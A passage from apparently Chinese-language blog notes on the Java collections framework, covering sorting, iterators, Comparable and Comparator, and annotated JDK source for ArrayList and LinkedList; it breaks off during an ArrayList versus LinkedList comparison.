<h2 id="Collections工具类"><a href="#Collections工具类" class="headerlink" title="Collections工具类"></a>Collections工具类</h2><p>collections是针对集合类的一个帮助类，提供了一系列的静态方法实现对各种集合的<strong>搜索，排序，线程安全化</strong>等操作</p>
<h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><h4 id="Collections-sort"><a href="#Collections-sort" class="headerlink" title="Collections.sort()"></a>Collections.sort()</h4><p>如果数组长度大于等于286且连续性较好的话，就用归并排序，如果大于等于286且连续性不好的话，使用双轴快速排序</p>
<p>如果小于286且大于等于47的话就使用双轴快速排序，如果长度小于47的话就使用插入排序</p>
<h4 id="Arrays-sort"><a href="#Arrays-sort" class="headerlink" title="Arrays.sort()"></a>Arrays.sort()</h4><p><code>LegacyMergeSort.userRequested</code>为 true 的话就会使用<strong>归并排序</strong>，可以通过下面代码设置为true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.util.Arrays.useLegacyMergeSort&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>不为 true 的话就会用一个叫 <strong>TimSort</strong> 的排序算法。</p>
<h2 id="list-set-map"><a href="#list-set-map" class="headerlink" title="list/set/map"></a>list/set/map</h2><ul>
<li>List是有序可重复序列，其实现的接口有:ArrayList、LinkedList、Vector</li>
<li>Set是无序不可重复序列，其实现接口有:HashSet、TreeSet</li>
<li>Map键值对容器，存放的是key-value形式，key值不允许重复，value内容可以相同，实现的接口有HashMap、TreeMap、LinkedHashMap</li>
</ul>
<h2 id="iteractor"><a href="#iteractor" class="headerlink" title="iteractor"></a>iteractor</h2><p><strong>所有集合类Collection都实现了iterable接口</strong></p>
<p>例如：（1）ArrayList实现了iterable接口，调用iterator()方法返回值实现了多态</p>
<p>​           （2）调用ArrayList内部类（该内部类实现了iterator接口，防止内存泄露使用内部类）</p>
<p> 1、iterator():将元素封装进容器</p>
<p> 2、hasNext():boolean是否还有下一个元素</p>
<p> 3、next():返回下一个元素</p>
<p> 4、remove() : 移除，但不能指定元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Iterator iterator=list.iterator();</span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">    <span class="keyword">int</span> i=(<span class="keyword">int</span>)iterator.next();</span><br><span class="line">    System.out.println(i);</span><br><span class="line"><span class="comment">//  System.out.println(iterator.next());</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Iterator和ListIterator的区别"><a href="#Iterator和ListIterator的区别" class="headerlink" title="Iterator和ListIterator的区别"></a>Iterator和ListIterator的区别</h3><ul>
<li><p><code>listIterator</code>是<code>iterator</code>的子类，只能用于遍历list集合。而<code>iterator</code>可以用来遍历list和set</p>
</li>
<li><p><code>listIterator</code>包含<code>hasNext()和hasPrevious()</code>方法，可以用来前向和后向遍历，而<code>iterator</code>只能后向遍历</p>
</li>
<li><p><code>listIterator</code>继承与<code>iterator</code>接口，扩展其他的功能，如增加元素<code>add()</code>,替换元素<code>set()</code>，获得后一个元素<code>nextIndex()</code>和前一个元素<code>previousIndex()</code>的索引</p>
</li>
<li><p><code>Collection</code> 接口实现 <code>Iterable</code> 接口,每个集合都通过实现 <code>Iterable</code> 接口中 <code>iterator()</code> 方法返回 <code>Iterator</code> 接口的实例, 然后对集合的元素进行迭代操作。</p>
</li>
<li><p>在迭代元素的时候不能通过集合的方法删除元素, 否则会抛出 <code>ConcurrentModificationException</code> 异常. 但是可以通过 <code>Iterator</code> 接口中的 <code>remove()</code> 方法进行删除。</p>
</li>
</ul>
<h2 id="Comparable-Comparator"><a href="#Comparable-Comparator" class="headerlink" title="Comparable/Comparator"></a>Comparable/Comparator</h2><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p><code>Comparable</code>和<code>Comparator</code>都是用来实现集合中的元素比较、排序的</p>
<ul>
<li><code>Comparable</code>来自<code>java.lang</code>包，有一个<code>compareTo(Object obj)</code>方法用来排序，是在<strong>集合内部</strong>进行排序</li>
<li><code>Comparator</code>来自<code>java.util</code>包，有一个<code>compare(Object obj1,Object obj2)</code>方法用来排序，是在<strong>集合外部</strong>进行排序，用来对已经创建好的类进行排序，符合oo原则，对<strong>修改关闭，对扩展开放</strong></li>
</ul>
<h3 id="Comparator"><a href="#Comparator" class="headerlink" title="Comparator"></a>Comparator</h3><blockquote>
<p>定制排序</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(<span class="number">1</span>);</span><br><span class="line">arrayList.add(<span class="number">2</span>);</span><br><span class="line">arrayList.add(-<span class="number">1</span>);</span><br><span class="line">arrayList.add(<span class="number">30</span>);</span><br><span class="line">arrayList.add(<span class="number">12</span>);</span><br><span class="line">Collections.sort(arrayList, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o1-o2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">System.out.println(<span class="string">&quot;定制排序后&quot;</span>+arrayList);</span><br></pre></td></tr></table></figure>

<h3 id="Comparable"><a href="#Comparable" class="headerlink" title="Comparable"></a>Comparable</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Comparable是泛型,可以指定类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Cat</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略构造方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//实现接口中的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Cat o)</span></span>&#123;</span><br><span class="line">        <span class="comment">//该方法用于比较此对象与指定对象的顺序,如果该对象小于,等于,大于指定对象,则分别返回负整数,零或正整数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age-o.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Cat[] cats = &#123;<span class="keyword">new</span> Cat(<span class="string">&quot;小a&quot;</span>,<span class="number">2</span>),<span class="keyword">new</span> Cat(<span class="string">&quot;小b&quot;</span>,<span class="number">1</span>),<span class="keyword">new</span> Cat(<span class="string">&quot;小c&quot;</span>,<span class="number">6</span>)&#125;;</span><br><span class="line"><span class="comment">//此时可以进行比较</span></span><br><span class="line">Arrays.sort(cats);</span><br></pre></td></tr></table></figure>

<h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h2><p>增强for，必须是实现java.lang.Iterable接口，重写iterator</p>
<p>格式：for(类型 临时变量：容器变量){  循环体 }</p>
<p>​            没有增加删除方法,只能遍历</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s=&#123;<span class="string">&quot;哦哦&quot;</span>,<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;ss&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(String s1:s)&#123;</span><br><span class="line">    System.out.println(s1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="List"><a href="#List" class="headerlink" title="List"></a>List</h1><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><p><img src="https://csn.damyoung.cn/image-20201231172117218.png" alt="image-20201231172117218"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认容量10</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br><span class="line"><span class="comment">//空的数据元素数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"><span class="comment">//空数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"><span class="comment">//数据元素</span></span><br><span class="line"><span class="keyword">transient</span> Object[] elementData; <span class="comment">// non-private to simplify nested class access</span></span><br><span class="line"><span class="comment">//长度</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> size;</span><br></pre></td></tr></table></figure>

<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>在使用默认无参构造时，会创建一个空数组，只有在第一次插入数据时，才会将数组容量初始化为10</p>
<p>在使用带参构造时，会创建一个给定参数大小的数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认长度</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (initialCapacity == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Illegal Capacity: &quot;</span>+</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>每次指定数组扩容大小为原有数组容量的1.5倍</p>
<ul>
<li>ArrayList通过<strong>拷贝</strong>(<code>Arrays.copyOf()</code> )原有数组的形式，来进行原数组的扩容</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最大数组长度</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_ARRAY_SIZE = Integer.MAX_VALUE - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//扩容方法</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">    <span class="comment">//每次扩容指定new容量为旧容量的1.5倍</span></span><br><span class="line">    <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="comment">//new容量比数组最大size大,该new容量不能使用，要对给定minCapacity进行判断</span></span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//hugeCapacity()进行判断</span></span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    <span class="comment">// 通过拷贝原有数组的形式来进行扩容</span></span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">    <span class="comment">//minCapacity&gt;MAX_ARRAY_SIZE返回Integer最大值</span></span><br><span class="line">    <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">        Integer.MAX_VALUE :</span><br><span class="line">        MAX_ARRAY_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><h4 id="arraycopy-copyOf"><a href="#arraycopy-copyOf" class="headerlink" title="arraycopy/copyOf"></a>arraycopy/copyOf</h4><ul>
<li><p><code>Arrays.copyOf()</code>本质上也是调用<code>System.arraycopy()</code>方法</p>
</li>
<li><p><code>copyOf</code>方法通过给定数组长度在内部创建一个新数组，然后将内容复制到这个数组然后返回该数组。</p>
<p><code>arraycopy</code>需要传入目的数组，将复制后的数据放入目的数组中</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] copyOf(<span class="keyword">byte</span>[] original, <span class="keyword">int</span> newLength) &#123;</span><br><span class="line">    <span class="comment">//通过给定长度来创建一个新数组</span></span><br><span class="line">    <span class="keyword">byte</span>[] copy = <span class="keyword">new</span> <span class="keyword">byte</span>[newLength];</span><br><span class="line">    System.arraycopy(original, <span class="number">0</span>, copy, <span class="number">0</span>,</span><br><span class="line">                     Math.min(original.length, newLength));</span><br><span class="line">    <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h4><p>使用<code>System.arraycopy</code>方法复制当前数组</p>
<ol>
<li><p>将插入位置后面的数组元素后移</p>
</li>
<li><p>插入位置元素</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">    rangeCheckForAdd(index);</span><br><span class="line">	<span class="comment">//判断容量是否不足，是否执行扩容策略</span></span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    <span class="comment">//复制当前数组，将插入位置后面的元素后移</span></span><br><span class="line">    System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                     size - index);</span><br><span class="line">    <span class="comment">//插入index位置的数据</span></span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><code>ArrayList</code>基于数组实现，并且具有<strong>动态扩容</strong>的特性，因此保存的元素的数组不一定都会被使用到，所以没必要全部进行序列化。</p>
<h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ol>
<li><p>实现了<code>List</code>接口和<code>Deque</code>接口的双端链表</p>
</li>
<li><p>底层的链表结构，使得有着高效的插入删除操作，另外实现了<code>Deque</code>接口，使得其具有队列的特性</p>
</li>
<li><p>不是线程安全的，可以调用<code>Collections.synchronizedList</code>方法</p>
</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20201231172100079.png" alt="image-20201231172100079"></p>
<p><strong>特征</strong></p>
<ol>
<li>构建Node节点大部分都是指定前驱节点<code>new Node&lt;&gt;(pred,e,null)</code></li>
<li>链表范围一般包括<code>0&lt;=index&lt;size</code> &amp;&amp; <code>index==size</code> 俩部分</li>
<li>链表的<code>first &amp;&amp; last</code>指针作为边界问题要进行考虑</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链表默认长度为0,优于数组ArrayList</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//头结点指针</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;E&gt; first;</span><br><span class="line"><span class="comment">//尾结点指针</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;E&gt; last;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">//元素数据</span></span><br><span class="line">    E item;</span><br><span class="line">    <span class="comment">//后继</span></span><br><span class="line">    Node&lt;E&gt; next;</span><br><span class="line">    <span class="comment">//前驱</span></span><br><span class="line">    Node&lt;E&gt; prev;</span><br><span class="line"></span><br><span class="line">    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">        <span class="keyword">this</span>.item = element;</span><br><span class="line">        <span class="keyword">this</span>.next = next;</span><br><span class="line">        <span class="keyword">this</span>.prev = prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获得指定位置节点"><a href="#获得指定位置节点" class="headerlink" title="获得指定位置节点"></a>获得指定位置节点</h3><p>使用二分查找，分别从首尾节点(first,last)开始<strong>遍历</strong>查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//用于检查是否outOfBounds</span></span><br><span class="line">    checkElementIndex(index);</span><br><span class="line">    <span class="comment">//返回节点的数据</span></span><br><span class="line">    <span class="keyword">return</span> node(index).item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node&lt;E&gt; <span class="title">node</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//size/2,使用二分查找的方法进行查找</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="comment">//从头节点开始遍历查找</span></span><br><span class="line">        Node&lt;E&gt; x = first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">            x = x.next;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//从尾节点开始遍历查找</span></span><br><span class="line">        Node&lt;E&gt; x = last;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">            x = x.prev;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="集合插入链表"><a href="#集合插入链表" class="headerlink" title="集合插入链表"></a>集合插入链表</h3><p>分为<strong>插入连接</strong>俩个大步骤，涉及几个属性</p>
<blockquote>
<ul>
<li>LinkedList的first/last属性，(first属性需要在插入时指定，last属性需要在连接时指定)</li>
<li>插入位置pred/succ节点  (pred用于元素后移插入，succ用于链表连接时)</li>
<li>节点node的next/prev属性（next用于插入时）</li>
</ul>
</blockquote>
<p><strong>考虑</strong></p>
<ol>
<li>插入位置<code>index==size &amp;&amp; index∈[0,index)</code></li>
<li>遍历插入时，考虑first指针是否要进行重置，即插入位置是否为首节点</li>
<li>链表连接时，考虑last指针是否要进行重置，即插入位置是否为尾部(index==size)</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addAll(size, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//1.检查插入位置是否正确，0&lt;= index&lt;=index,意味着可以插入到尾节点后一位</span></span><br><span class="line">    checkPositionIndex(index);</span><br><span class="line">	<span class="comment">//2.将集合转化为Object数组</span></span><br><span class="line">    Object[] a = c.toArray();</span><br><span class="line">    <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">    <span class="keyword">if</span> (numNew == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	<span class="comment">//3.构建节点用于指定插入位置的前驱后继节点</span></span><br><span class="line">    <span class="comment">//前驱节点用来插入元素进行后移使用</span></span><br><span class="line">    <span class="comment">//后继节点用来记录插入位置的节点，便于俩链表的连接。</span></span><br><span class="line">    Node&lt;E&gt; pred, succ;</span><br><span class="line">    <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">        <span class="comment">//插入位置为尾部</span></span><br><span class="line">        succ = <span class="keyword">null</span>;</span><br><span class="line">        pred = last;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//以这样的形式涵盖了首节点，但首节点的判断留到插入时判断</span></span><br><span class="line">        succ = node(index);</span><br><span class="line">        pred = succ.prev;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//遍历集合元素插入</span></span><br><span class="line">    <span class="keyword">for</span> (Object o : a) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> E e = (E) o;</span><br><span class="line">        <span class="comment">//创建新节点，同时指定前驱节点</span></span><br><span class="line">        Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(pred, e, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//如果插入位置是首节点,忽略这步，first属性无法指定</span></span><br><span class="line">        <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pred.next = newNode;</span><br><span class="line">        <span class="comment">//此时仅仅对pred进行移动，节点后移</span></span><br><span class="line">        pred = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//如果插入位置为尾部(尾结点后一位)时，重置last节点</span></span><br><span class="line">    <span class="keyword">if</span> (succ == <span class="keyword">null</span>) &#123;</span><br><span class="line">        last = pred;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//否则，将插入链表与原链表的后半部分连接起来</span></span><br><span class="line">        pred.next = succ;</span><br><span class="line">        succ.prev = pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size += numNew;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤</strong></p>
<ol>
<li>检查index范围(0-size,注意此时范围应该为0到尾节点后一位)</li>
<li>将集合通过<code>toArray()</code>方法存放到对象数组中</li>
<li>得到插入位置的前驱后继节点(分为尾结点后一个插入位置和任意位置)</li>
<li>遍历数组元素插入(插入位置的前驱节点后移)</li>
<li>通过succ插入位置的后继节点，将插入后的链表与后半部分连接起来</li>
</ol>
<h3 id="获取头节点数据"><a href="#获取头节点数据" class="headerlink" title="获取头节点数据"></a>获取头节点数据</h3><p>利用<code>first</code>头节点指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; f = first;</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">    <span class="keyword">return</span> f.item;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">element</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getFirst();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; f = first;</span><br><span class="line">    <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : f.item;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">peekFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; f = first;</span><br><span class="line">    <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : f.item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>区别</strong></p>
<ol>
<li><p><code>getFirst</code>和<code>element</code>方法在链表为空时会抛出异常<code>NoSuchElementException</code>，</p>
</li>
<li><p><code>peek</code>和<code>peekFirst</code>会直接返回null。</p>
</li>
</ol>
<h3 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h3><p>分为俩种情况</p>
<ol>
<li><p>插入位置为==size</p>
</li>
<li><p>插入位置0&lt;=index&lt;size</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">    checkPositionIndex(index);</span><br><span class="line">	<span class="comment">//插入末尾元素</span></span><br><span class="line">    <span class="keyword">if</span> (index == size)</span><br><span class="line">        linkLast(element);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//插入0&lt;=index&lt;size位置元素</span></span><br><span class="line">        linkBefore(element, node(index));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">    <span class="comment">//构建节点，同时指定前驱节点</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">    last = newNode;</span><br><span class="line">    <span class="comment">//若链表中无元素存在</span></span><br><span class="line">    <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkBefore</span><span class="params">(E e, Node&lt;E&gt; succ)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// succ为插入位置的节点，</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; pred = succ.prev;</span><br><span class="line">    <span class="comment">//构建节点，给定插入节点的前驱后继节点</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(pred, e, succ);</span><br><span class="line">   	<span class="comment">//后继节点对newNode进行连接</span></span><br><span class="line">    succ.prev = newNode;</span><br><span class="line">    <span class="comment">//已经给定后继节点，需要对前驱节点进行判断</span></span><br><span class="line">    <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pred.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="队列和栈"><a href="#队列和栈" class="headerlink" title="队列和栈"></a>队列和栈</h3><p>以队列的形式，先进先出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.offer(<span class="string">&quot;后面添加&quot;</span>);</span><br><span class="line">list.poll();</span><br></pre></td></tr></table></figure>

<p>以栈的形式，先进后出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.push(<span class="string">&quot;前面添加&quot;</span>);</span><br><span class="line">list.pop();</span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure>

<h2 id="ArrayList-amp-LinkedList的区别"><a href="#ArrayList-amp-LinkedList的区别" class="headerlink" title="ArrayList&amp;LinkedList的区别"></a>ArrayList&amp;LinkedList的区别</h2><ol>
<li><p>ArrayList&amp;LinkedList都是不同步的，都是线程不安全的集合类</p>
</li>
<li><p>ArrayList内部是Object类型的数组，LinkedList内部是一个双向链表</p>
</li>
<li><p>ArrayList插入删除受到元素位置影响，若插入删除位置为数组末尾，时间复杂度为O(1)；若插入删除位置不为末尾，需要对该位置后面的元素进行后移/前移，时间复杂度为O(n-index);</p>
